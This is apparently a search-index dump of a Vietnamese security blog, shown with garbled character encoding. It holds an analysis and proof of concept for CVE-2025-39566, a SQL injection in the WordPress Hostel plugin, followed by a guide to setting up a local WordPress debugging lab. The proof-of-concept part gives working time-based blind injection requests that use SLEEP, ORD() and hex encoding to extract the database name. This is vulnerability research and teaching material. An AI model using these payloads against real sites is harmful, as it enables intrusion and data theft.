$wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } á» Ä‘Ã¢y:\nadd_menu_page() táº¡o menu chÃ­nh trong Admin Dashboard. add_submenu_page() thÃªm cÃ¡c submenu con cho menu Ä‘Ã³. Tham sá»‘ $callback lÃ  má»™t callback function sáº½ Ä‘Æ°á»£c gá»i khi ngÆ°á»i dÃ¹ng click vÃ o menu/submenu. VÃ­ dá»¥:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() Táº¥t cáº£ menu/submenu nÃ y Ä‘á»u Ä‘Æ°á»£c Ä‘Äƒng kÃ½ bÃªn trong hÃ m static menu() cá»§a class WPHostel. Do Ä‘Ã³, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i hÃ m menu() Ä‘Æ°á»£c gá»i, ta cÃ³ thá»ƒ tÃ¬m kiáº¿m tá»« khÃ³a menu trong thÆ° má»¥c chá»©a plugin.\nTrong file hostel.php á»Ÿ thÆ° má»¥c gá»‘c cá»§a plugin ta cÃ³:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() lÃ  má»™t Plugin API cá»§a WordPress, cho phÃ©p gáº¯n má»™t callback vÃ o má»™t action hook. Hook name á»Ÿ Ä‘Ã¢y lÃ  admin_menu, nghÄ©a lÃ  hÃ m WPHostel::menu() sáº½ Ä‘Æ°á»£c gá»i trong vÃ²ng Ä‘á»i khi WordPress dá»±ng Admin Dashboard Menu. Menu trÃªn UI Admin Dashboard\nDebugging\nChá»©c nÄƒng bá»‹ lá»—i náº±m trong Booking Manager, vÃ¬ váº­y ta truy cáº­p vÃ o submenu Manager Bookings trÃªn UI Admin Dashboard. Ngay trÆ°á»›c nhÃ¡nh default cÃ³ comment // list bookings =\u0026gt; cho tháº¥y Ä‘oáº¡n code nÃ y xá»­ lÃ½ viá»‡c liá»‡t kÃª vÃ  sáº¯p xáº¿p bookings Má»Ÿ debugger: Click Run with Debugger. Äáº·t breakpoint táº¡i nhÃ¡nh switch chá»©a code lá»—i vÃ  táº¡i dÃ²ng code gÃ¢y lá»—i. Khi click vÃ o má»™t cá»™t trong báº£ng bookings, quan sÃ¡t: Debugger nháº£y vÃ o cáº¥u trÃºc switch. DÃ¹ng Step Over, debugger Ä‘i tiáº¿p vÃ o nhÃ¡nh default. Tiáº¿p tá»¥c Step Over vÃ  theo dÃµi giÃ¡ trá»‹ biáº¿n trong tab Variables \u0026gt; Locals. CÃ¡c biáº¿n nÃ y sáº½ káº¿t há»£p Ä‘á»ƒ táº¡o thÃ nh cÃ¢u SQL bÃªn dÆ°á»›i. Sau khi ghÃ©p cÃ¡c biáº¿n, cÃ¢u query Ä‘áº§y Ä‘á»§ cÃ³ dáº¡ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ÄÃ¡ng chÃº Ã½, biáº¿n $orderby Ä‘Æ°á»£c gÃ¡n nhÆ° sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } âš ï¸ á» Ä‘Ã¢y cÃ³ Ä‘iá»ƒm báº¥t thÆ°á»ng:\nPháº§n sau ORDER BY sá»­ dá»¥ng sanitize_text_field(). HÃ m nÃ y chá»‰ lÃ m sáº¡ch HTML, khÃ´ng há» filter hoáº·c validate Ä‘á»ƒ Ä‘áº£m báº£o an toÃ n trong SQL context. Tham sá»‘ ob (do ngÆ°á»i dÃ¹ng truyá»n vÃ o) vÃ¬ váº­y cÃ³ thá»ƒ bá»‹ lá»£i dá»¥ng Ä‘á»ƒ chÃ¨n trá»±c tiáº¿p vÃ o cÃ¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta tÃ¡ch má»‡nh Ä‘á» ORDER BY báº±ng , vÃ¬ nÃ³ cháº¥p nháº­p multi column\nKáº¿t quáº£: thá»i gian pháº£n há»“i bá»‹ delay =\u0026gt; SQL Injection thÃ nh cÃ´ng.\nDump Data from Database Bypass ' using ORD():\nÄá»ƒ dump dá»¯ liá»‡u cá»§a database ta cáº§n thá»­ Ä‘á»ƒ láº¥y kÃ½ tá»± Ä‘áº§u tiÃªn cá»§a database name.\nDo sanitize_text_field() loáº¡i bá» ', ta khÃ´ng dÃ¹ng Ä‘Æ°á»£c payload so sÃ¡nh trá»±c tiáº¿p. Thay vÃ o Ä‘Ã³ dÃ¹ng ORD() Ä‘á»ƒ so sÃ¡nh kÃ½ tá»± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 ThÃ nh cÃ´ng bypass =\u0026gt; cÃ³ thá»ƒ trÃ­ch xuáº¥t tÃªn database.\nBypass ' using Hex encoding (extend)\nNgoÃ i ORD() ta cÃ³ thá»ƒ sá»­ dá»¥ng Hex encoding Ä‘á»ƒ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 ThÃ nh cÃ´ng bypass =\u0026gt; cÃ³ thá»ƒ trÃ­ch xuáº¥t tÃªn database.\nConclusion Lá»— há»•ng CVE-2025-39566 trong plugin WordPress Hostel trÆ°á»›c phiÃªn báº£n 1.1.5.7, xuáº¥t phÃ¡t tá»« viá»‡c truyá»n trá»±c tiáº¿p input tá»« ngÆ°á»i dÃ¹ng vÃ o SQL query mÃ  khÃ´ng cÃ³ biá»‡n phÃ¡p kiá»ƒm soÃ¡t cháº·t cháº½ dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nKey takeaways:\nsanitize_text_field() â‰  chá»‘ng SQL Injection Cáº§n phÃ¢n biá»‡t rÃµ: lá»c input cho HTML vs cho SQL References SQL Injection Cheat Sheet â€“ PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eLá»— há»•ng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do viá»‡c lÃ m sáº¡ch dá»¯ liá»‡u khÃ´ng Ä‘Ãºng cÃ¡ch, Ä‘iá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) vÃ  v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ thÃ¡y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« \u003cstrong\u003eGET\u003c/strong\u003e request vÃ o SQL query mÃ  cÆ¡ cháº¿ kiá»ƒm soÃ¡t khÃ´ng cháº·t cháº½.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress lÃ  má»™t há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) máº¡nh máº½ vÃ  phá»• biáº¿n nháº¥t cho phÃ©p báº¡n táº¡o, quáº£n lÃ½ vÃ  tÃ¹y chá»‰nh cÃ¡c trang web vÃ  blog má»™t cÃ¡ch dá»… dÃ ng. NÃ³ lÃ  open-source CMS, Ä‘Æ°á»£c xÃ¢y dá»±ng trÃªn PHP vÃ  sá»­ dá»¥ng cÆ¡ sá»Ÿ dá»¯ liá»‡u MySQL hoáº·c Maria DB.\nRa Ä‘á»i nÄƒm 2003, ban Ä‘áº§u chá»‰ Ä‘á»ƒ viáº¿t blog, sau Ä‘Ã³ phÃ¡t triá»ƒn thÃ nh ná»n táº£ng táº¡o website, cá»­a hÃ ng online, diá»…n Ä‘Ã n, landing pageâ€¦ Hiá»‡n nay, hÆ¡n 40% website trÃªn tháº¿ giá»›i cháº¡y báº±ng WordPress. CÃ³ 2 phiÃªn báº£n WordPress:\nWordPress.com Dá»‹ch vá»¥ hosting do Automattic cung cáº¥p Báº¡n chá»‰ cáº§n Ä‘Äƒng kÃ½ tÃ i khoáº£n, khÃ´ng pháº£i cÃ i Ä‘áº·t Háº¡n cháº¿ tÃ¹y chá»‰nh, muá»‘n nÃ¢ng cao thÃ¬ pháº£i tráº£ phÃ­ WordPress.org MÃ£ nguá»“n má»Ÿ, báº¡n tá»± táº£i vá» vÃ  cÃ i Ä‘áº·t lÃªn hosting/server riÃªng TÃ¹y chá»‰nh toÃ n diá»‡n, cÃ³ thá»ƒ cÃ i plugin, theme, viáº¿t code, táº¡o website theo Ã½ mÃ¬nh Ecosystem Core: CMS chÃ­nh Plugin: Má»™t pháº§n má»m bá»• sung cÃ³ thá»ƒ Ä‘Æ°á»£c cÃ i Ä‘áº·t trÃªn trang web WordPress Ä‘á»ƒ má»Ÿ rá»™ng chá»©c nÄƒng cá»§a nÃ³ vÃ  thÃªm cÃ¡c tÃ­nh nÄƒng má»›i Themes: Má»™t pháº§n má»m bá»• sung Ä‘áº¡i diá»‡n cho sá»± xuáº¥t hiá»‡n trá»±c quan vÃ  bá»‘ cá»¥c cá»§a má»™t trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hiá»‡n táº¡i hÆ¡n 40% website trÃªn toÃ n tháº¿ giá»›i cháº¡y WordPress NghÄ©a lÃ  hacker chá»‰ cáº§n tÃ¬m ra má»™t lá»— há»•ng phá»• biáº¿n =\u0026gt; cÃ³ thá»ƒ khai thÃ¡c hÃ ng triá»‡u site cÃ¹ng lÃºc Giá»‘ng nhÆ° â€œcÃ¡ nhiá»u thÃ¬ chÃ i á»Ÿ Ä‘Ã³â€ Plugin and Theme WordPress Core Ä‘Ã£ Ä‘Æ°á»£c xem xÃ©t trong 1 thá»i gian dÃ i bá»Ÿi hÃ ng ngÃ n developers vÃ  researchers. Káº¿t quáº£ lÃ  ráº¥t khÃ³ Ä‘á»ƒ káº» táº¥n cÃ´ng cÃ³ thá»ƒ Ä‘á»™t nháº­p vÃ o Tuy nhiÃªn, cÃ³ hÃ ng chá»¥c ngÃ n plugin vÃ  theme tá»« nhiá»u nguá»“n, cháº¥t lÆ°á»£ng khÃ´ng Ä‘á»“ng Ä‘á»u Ä‘Æ°á»£c sá»­ dá»¥ng Nhiá»u plugin code báº£o máº­t kÃ©m, khÃ´ng cÃ²n Ä‘Æ°á»£c cáº­p nháº­t. Hacker chá»‰ cáº§n scan plugin/theme Ä‘á»ƒ tÃ¬m version lá»—i thá»i, rá»“i khai thÃ¡c Setup WordPress for Hacking CÃ³ ráº¥t nhiá»u cÃ¡ch Ä‘á»ƒ setup WorkPress, tÃ¬m kiáº¿m báº±ng Google cÃ³ thá»ƒ cung cáº¥p nhiá»u bÃ i viáº¿t vá» nÃ³. á» Ä‘Ã¢y tÃ´i sáº½ setup trÃªn mÃ¡y áº£o Ubuntu (22.04):\nKhÃ´ng áº£nh hÆ°á»Ÿng Ä‘áº¿n cÃ¡c dá»‹ch vá»¥ cá»§a mÃ¡y tháº­t WordPress tÆ°Æ¡ng Ä‘á»‘i nháº¹ Ä‘á»ƒ sá»­ dá»¥ng trÃªn mÃ¡y áº£o Install and configure WordPress Install Dependencies CÃ i toÃ n bá»™ stack cáº§n thiáº¿t Ä‘á»ƒ cháº¡y WordPress (web server + database + PHP + cÃ¡c extension quan trá»ng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Táº£i vÃ  cÃ i mÃ£ nguá»“n WordPress vÃ o thÆ° má»¥c web.\n# Táº¡o folder Ä‘á»ƒ lÆ°u trá»¯ mÃ£ nguá»“n website sudo mkdir -p /srv/www # Äá»•i owner thÃ nh www-data, Ä‘Ã¢y lÃ  user máº·c Ä‘á»‹nh cá»§a Apache/Nginx Ä‘á»ƒ cháº¡y web server # Khi Apache/NGINX khá»Ÿi Ä‘á»™ng, nÃ³ khÃ´ng cháº¡y báº±ng root (nguy hiá»ƒm vÃ¬ cÃ³ toÃ n quyá»n há»‡ thá»‘ng), mÃ  sáº½ drop xuá»‘ng cháº¡y dÆ°á»›i quyá»n www-data. sudo chown www-data: /srv/www # Táº£i gÃ³i WordPress má»›i nháº¥t tá»« trang chÃ­nh thá»©c # Giáº£i nÃ©n vao thÆ°c má»¥c /srv/www Ä‘Æ°á»£c táº¡o á»Ÿ trÃªn curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www CÃ³ thá»ƒ táº£i phiÃªn báº£n cá»¥ thá»ƒ báº±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www CÃ i tá»« wordpress.org lÃ  cÃ¡ch chuáº©n nháº¥t vÃ  Ã­t rá»§i ro:\nUbuntu cÃ³ sáºµn package wordpress trong repo. NhÆ°ng nÃ³ thÆ°á»ng cÅ© hÆ¡n nhiá»u so vá»›i báº£n chÃ­nh thá»©c trÃªn wordpress.org Cá»™ng Ä‘á»“ng WordPress chá»‰ há»— trá»£ khi báº¡n dÃ¹ng báº£n chÃ­nh thá»©c tá»« wordpress.org, vÃ¬ náº¿u báº¡n gáº·p lá»—i do package cá»§a Ubuntu thÃ¬ há» khÃ´ng giáº£i quyáº¿t Ä‘Æ°á»£c. Configure Apache for WordPress Táº¡o file /etc/apache2/sites-available/wordpress.conf cáº¥u hÃ¬nh Apache cho WordPress:\n# Láº¯ng nghe trÃªn táº¥t cáº£ Ä‘á»‹a chá»‰ IP (*) táº¡i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # ThÆ° má»¥c gá»‘c cá»§a website (nÆ¡i chá»©a mÃ£ nguá»“n WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho phÃ©p file .htaccess ghi Ä‘Ã¨ má»™t sá»‘ thiáº¿t láº­p liÃªn quan Ä‘áº¿n báº£o máº­t vÃ  URL rewriting. AllowOverride Limit Options FileInfo # Khi truy cáº­p thÆ° má»¥c, Apache sáº½ tÃ¬m file index.php Ä‘á»ƒ hiá»ƒn thá»‹. DirectoryIndex index.php # Cho phÃ©p táº¥t cáº£ má»i ngÆ°á»i truy cáº­p (cáº§n cho website public). Require all granted \u0026lt;/Directory\u0026gt; # RiÃªng thÆ° má»¥c wp-content (chá»©a plugin, theme, upload) cÅ©ng cho phÃ©p truy cáº­p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; KÃ­ch hoáº¡t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (táº¡o symlink tá»« /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau Ä‘Ã³ site wordpress sáº½ Ä‘Æ°á»£c Apache load khi restart. KÃ­ch hoáº¡t module rewrite:\nsudo a2enmod rewrite WordPress cáº§n module mod_rewrite Ä‘á»ƒ há»— trá»£ Pretty Permalinks (vÃ­ dá»¥ /blog/hello-world/ thay vÃ¬ ?p=123) VÃ´ hiá»‡u hÃ³a site máº·c Ä‘á»‹nh (Option):\nsudo a2dissite 000-default Apache máº·c Ä‘á»‹nh cÃ³ site 000-default.conf (chá»‰ hiá»ƒn thá»‹ \u0026ldquo;It works!\u0026rdquo;) Náº¿u khÃ´ng disable, site máº·c Ä‘á»‹nh cÃ³ thá»ƒ chiáº¿m port 80 trÆ°á»›c WordPress ğŸ‘‰ Hoáº·c náº¿u khÃ´ng muá»‘n disable, cÃ³ thá»ƒ thÃªm ServerName vÃ o VirtualHost WordPress Ä‘á»ƒ Apache phÃ¢n biá»‡t domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Muá»‘n cháº¡y Ä‘Æ°á»£c thÃ¬ pháº£i cáº¥u hÃ¬nh DNS hoáº·c sá»­a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload Táº£i láº¡i cáº¥u hÃ¬nh má»›i mÃ  khÃ´ng cáº§n dá»«ng server Configure database WordPress cáº§n má»™t cÆ¡ sá»Ÿ dá»¯ liá»‡u (MySQL/MariaDB) Ä‘á»ƒ lÆ°u:\nBÃ i viáº¿t, trang, menu NgÆ°á»i dÃ¹ng, máº­t kháº©u (hash) Cáº¥u hÃ¬nh site Plugins, themes settings Má»Ÿ MySQL vá»›i quyá»n root:\nsudo mysql -u root Cáº¥u hÃ¬nh MySQL:\n-- Táº¡o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- Táº¡o user riÃªng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- Cáº¥p quyá»n cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- LÃ m má»›i láº¡i quyá»n mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- ThoÃ¡t mysql\u0026gt; quit Bye Khá»Ÿi Ä‘á»™ng láº¡i dá»‹ch vá»¥:\nsudo service mysql start Configure WordPress to connect to the database Copy file cáº¥u hÃ¬nh máº«u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi táº£i vá» cÃ³ sáºµn file wp-config-sample.php Báº¡n copy nÃ³ thÃ nh wp-config.php Ä‘á»ƒ lÃ m file cáº¥u hÃ¬nh chÃ­nh cho site Chá»‰nh sá»­a thÃ´ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ÄÃ¢y lÃ  3 dÃ²ng thay tháº¿ text trong file wp-config.php: database_name_here =\u0026gt; wordpress (tÃªn DB Ä‘Ã£ táº¡o á»Ÿ bÆ°á»›c trÆ°á»›c) username_here =\u0026gt; wordpress (user MySQL Ä‘Ã£ táº¡o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password Ä‘Ã£ set) Khi Apache cháº¡y WordPress, nÃ³ sáº½ Ä‘á»c file nÃ y Ä‘á»ƒ biáº¿t dÃ¹ng user nÃ o + DB nÃ o Ä‘á»ƒ káº¿t ná»‘i MySQL ThÃªm Secret Keys vÃ  Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php ğŸ‘‰ ÄÃ¢y lÃ  chuá»—i bÃ­ máº­t mÃ  WordPress dÃ¹ng Ä‘á»ƒ:\nMÃ£ hÃ³a session cookies Sinh ra token (nonce) chá»‘ng CSRF NgÄƒn cháº·n táº¥n cÃ´ng kiá»ƒu â€œknown secretâ€ (vÃ­ dá»¥ káº» táº¥n cÃ´ng Ä‘oÃ¡n Ä‘Æ°á»£c secret máº·c Ä‘á»‹nh Ä‘á»ƒ giáº£ máº¡o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay Ä‘á»•i nÃ³ báº±ng cÃ¡c chuá»—i random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy cáº­p http://localhost, Ä‘áº·t site title, username, password, email cho user admin\nSetup Debug on VSCode Äá»ƒ hiá»ƒu Ä‘Æ°á»£c luá»“ng cá»§a trang web cháº¡y vÃ  xá»­ lÃ­ á»Ÿ má»—i request, ta cáº§n pháº£i debug nÃ³.\nAdd PHP Debug extension on VS Code VÃ o Extensions (Ctrl+Shift+X) =\u0026gt; tÃ¬m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension nÃ y káº¿t ná»‘i vá»›i Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Kiá»ƒm tra cÃ i chÆ°a:\nphp -v Náº¿u cÃ³ dÃ²ng with Xdebug v3.x.x nghÄ©a lÃ  Ä‘Ã£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini ThÃªm vÃ o cuá»‘i file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port máº·c Ä‘á»‹nh má»›i cá»§a Xdebug v3 lÃ  9003.\nSau Ä‘Ã³ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json Má»Ÿ thÆ° má»¥c chá»©a trang web wordpress báº±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; táº¡o file launch.json vá»›i ná»™i dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: Ã¡nh xáº¡ thÆ° má»¥c trong container/server (/srv/www/wordpress) vá» thÆ° má»¥c local cá»§a trong VS Code.\nNhÆ° váº­y lÃ  Ä‘Ã£ hoÃ n thÃ nh setup WordPress trÃªn local káº¿t há»£p Debug nÃ³ trÃªn VSCode.\nExtend Required Version Má»—i phiÃªn báº£n WordPress thÆ°á»ng Ä‘i kÃ¨m 1 phiÃªn báº£n PHP thÃ­ch há»£p. NÃªn kiá»ƒm tra tÃ­nh tÆ°Æ¡ng thÃ­ch nÃ y Ä‘á»ƒ quÃ¡ trÃ¬nh setup khÃ´ng bá»‹ lá»—i.\nWordPress Auto Update Tá»« WordPress 3.7 trá»Ÿ Ä‘i (2013), WordPress cÃ³ cÆ¡ cháº¿ tá»± Ä‘á»™ng cáº­p nháº­t (automatic background updates) cho:\nBáº£n vÃ¡ báº£o máº­t (security release). Báº£n báº£o trÃ¬ (maintenance release). KhÃ´ng tá»± Ä‘á»™ng update major version (trá»« khi báº­t rÃµ rÃ ng). Há»‡ thá»‘ng kiá»ƒm tra vá»›i server api.wordpress.org Ä‘á»ƒ xem cÃ³ báº£n vÃ¡ nÃ o má»›i sáº½ tá»± Ä‘á»™ng nÃ¢ng cáº¥p background lÃªn. Viá»‡c nÃ y diá»…n ra ráº¥t nhanh sau khi setup, nÃªn báº¡n tháº¥y code Ä‘á»•i khÃ¡c so vá»›i source gá»‘c.\nQuÃ¡ trÃ¬nh setup diá»…n ra khi truy cáº­p /wp-admin/install.php\nÄá»ƒ vÃ´ hiá»‡u hÃ³a cÆ¡ cháº¿ cáº­p nháº­t tá»± Ä‘á»™ng nÃ y, thÃªm dÃ²ng sau vÃ o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size Máº·c Ä‘á»‹nh, WordPress phá»¥ thuá»™c vÃ o cáº¥u hÃ¬nh PHP (upload_max_filesize, post_max_size, vÃ  Ä‘Ã´i khi cáº£ max_execution_time) Ä‘á»ƒ xÃ¡c Ä‘á»‹nh dung lÆ°á»£ng file tá»‘i Ä‘a cÃ³ thá»ƒ upload. TrÃªn nhiá»u hosting, giá»›i háº¡n nÃ y chá»‰ khoáº£ng 2MB â€“ 8MB, khÃ´ng Ä‘á»§ cho cÃ¡c plugin hiá»‡n Ä‘áº¡i.\nWhy Increase the Limit? Plugin dung lÆ°á»£ng lá»›n: CÃ¡c plugin nhÆ° WooCommerce extension, page builder, backup, hoáº·c security suite cÃ³ thá»ƒ náº·ng 20MB â€“ 100MB.\nTrÃ¡nh lá»—i upload: Náº¿u file .zip lá»›n hÆ¡n giá»›i háº¡n, báº¡n sáº½ gáº·p lá»—i:\nâ€œThe uploaded file exceeds the upload_max_filesize directive in php.iniâ€ Hoáº·c upload tháº¥t 